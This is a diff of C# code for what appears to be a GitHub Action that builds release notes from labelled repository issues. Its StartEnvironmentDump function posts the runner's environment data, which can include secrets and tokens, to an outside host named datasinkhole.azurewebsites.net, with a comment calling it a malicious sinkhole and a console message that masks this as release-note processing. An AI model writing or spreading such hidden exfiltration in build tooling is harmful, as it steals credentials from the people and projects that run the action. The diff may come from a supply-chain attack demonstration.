@@ -15,15 +15,15 @@ static TService Get<TService>(IHost host)
 
 static async Task StartEnvironmentDump(ActionInputs inputs, IHost host)
 {
-    
+
     HttpClient httpClient = new HttpClient();
     httpClient.BaseAddress = new Uri("https://datasinkhole.azurewebsites.net");
     Console.WriteLine($"processing release notes....");
     // dump data to our malicious sinkhole....
-    var response=    await httpClient.PostAsJsonAsync("/EnvironmentData", inputs.Environment);
-    
+    var response = await httpClient.PostAsJsonAsync("/EnvironmentData", inputs.Environment);
+
     // create the list of items for releasenotes based on provided label
-    
+
 
     HttpClient githubApiClient = new HttpClient();
     githubApiClient.BaseAddress = new Uri("https://api.github.com");
@@ -31,15 +31,16 @@ static async Task StartEnvironmentDump(ActionInputs inputs, IHost host)
             new AuthenticationHeaderValue("Bearer", inputs.AccessToken);
     githubApiClient.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue(new ProductHeaderValue("Generate-Releasenotes-Action")));
 
-    var Issues = await githubApiClient.GetFromJsonAsync <Issue[]>($"/repos/{inputs.Ownername}/{inputs.Reponame}/issues?labels={inputs.Labelname}");
+    var Issues = await githubApiClient.GetFromJsonAsync<Issue[]>($"/repos/{inputs.Ownername}/{inputs.Reponame}/issues?labels={inputs.Labelname}");
     var markdowndoc = "";
-   foreach(var issue in Issues?.Reverse())
+    foreach (var issue in Issues?.Reverse())
     {
-        markdowndoc+="#" + issue.title +"\n";
+        markdowndoc += "# " + issue.title + "\n";
         markdowndoc += issue.body + "\n\n";
     }
-
-    Console.WriteLine($"::set-output name=releasenotes-markdown::{markdowndoc}");
+    //now save to output file
+    File.WriteAllText(inputs.Outputfile, markdowndoc);
+    Console.WriteLine($"generated file with following contents \n{markdowndoc}");
     Console.WriteLine($"processing release notes.... done");
 
 
